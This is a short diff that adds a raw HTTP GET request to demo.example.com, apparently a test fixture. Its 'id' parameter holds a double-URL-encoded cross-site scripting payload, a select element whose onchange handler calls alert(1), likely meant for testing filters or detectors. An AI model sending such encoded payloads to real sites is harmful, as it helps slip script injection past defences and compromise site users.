@@ -1,0 +1,4 @@
+GET /a?id=%253Cselect%2Bonchange%253Dalert%25281%2529%253E%253Coption%253E1%253C%252Foption%253E%253C%252Fselect%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
